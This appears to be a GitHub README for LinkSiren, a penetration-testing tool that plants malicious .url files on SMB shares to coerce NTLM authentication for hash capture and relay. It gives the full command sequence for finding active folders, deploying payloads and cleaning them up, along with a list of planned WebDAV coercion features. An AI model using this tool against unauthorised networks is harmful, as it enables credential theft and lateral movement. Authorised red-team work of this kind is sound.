# LinkSiren

## What is this tool?
LinkSiren distributes .url files to accessible file shares to coerce NTLM authentication from hosts that open them, like [Farmer](https://github.com/mdsecactivebreach/Farmer/tree/1f37598125a92c9edf41295c6c1b7c258143968d), [Lnkbomb](https://github.com/dievus/lnkbomb), or [Slinky](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky) but with prioritized locations and scalable deployment and cleanup.

## How do I use this NOW?
```bash
git clone https://github.com/gjhami/LinkSiren.git && cd LinkSiren
python -m pip install -r requirements.txt
python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets <shares file> --identify
python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --deploy
# Capture hashes
python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt --cleanup
```

## How do I use this the \~right\~ way?
```bash
# Download and install requirements
git clone https://github.com/gjhami/LinkSiren.git
cd LinkSiren

# Set up a virtual environment and install requirements
python -m venv .venv
source ./.venv/bin/activate # Linux
# .\.venv\Scripts\activate # Windows
python -m pip install -r requirements.txt

# 1. Create a targets file containing accessible shares, one per line, in the following format: \\server.domain.tld\share
#    I recommend crackmapexec or shareenum 
# 2. Use LinkSiren to identify the most active folders on them
#    Note: You may fine tune the --max-depth, --active-threshold, --fast, and --max-folders-per-share params as necessary
python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets <shares file> --identify
# 3. Use LinkSiren to deploy payloads to all of the active folders
#    --identify saves UNC paths to active folders in folder_targets.txt
python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --deploy
# 4. Let the hashes come to you and relay them as you see fit :) (I recommend CrackMapExec and LdapRelayScan)
# 5. Cleanup the payload files when you're finished gathering.
#    Set targets to a file containing UNC paths of all folders where payloads were written
#    Note: If you set a custom payload name when deploying, you must set the same name here
#    --deploy saves UNC paths to deployed payloads in payload_folders.txt
python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt --cleanup
```

## How is this better than the other tools?
Other tools are built to place a single malicious .url file at a specified location and clean them up one at a time. But if you find yourself with access to a lot of shares you may want things to scale and you may not be in the mood to write a wrapper. LinkSiren crawls shares you currently have access to and ranks every subfolder based on the liklihood it will be opened by a user soon so you can target .url file distribution. Additionally, LinkSiren records the full UNC path of every .url file it creates, allowing for cleanup with a single command.

Summary
- Scales to an arbitrary number of .url files
- Targeted .url placement
- Single command cleanup
- Cross platform with python
  
## How will you make it even better?
I'm looking to add the following features:
- [ ] Start the WebClient service on targets using searchConnector-ms and library-ms files (see [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#start-the-webclient-service) and [Farmer Source Code](https://github.com/mdsecactivebreach/Farmer/blob/main/crop/Crop/Crop.cs))
- [ ] Coerce HTTP authentication with WebDAV connection strings (see [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#abuse))
- [ ] Add a progress bar for share crawling
- [ ] Enable ticket based authnentication (Kerberos)
- [ ] Multithreading/Multiprocessing for faster share crawling

## Note
This tools is designed for ethical hacking and penetration testing. It should be used exclusively on networks where explicit, written permission has been granted for testing. I accept no responsibility for the safety or effectiveness of this tool. Please don't sue me.
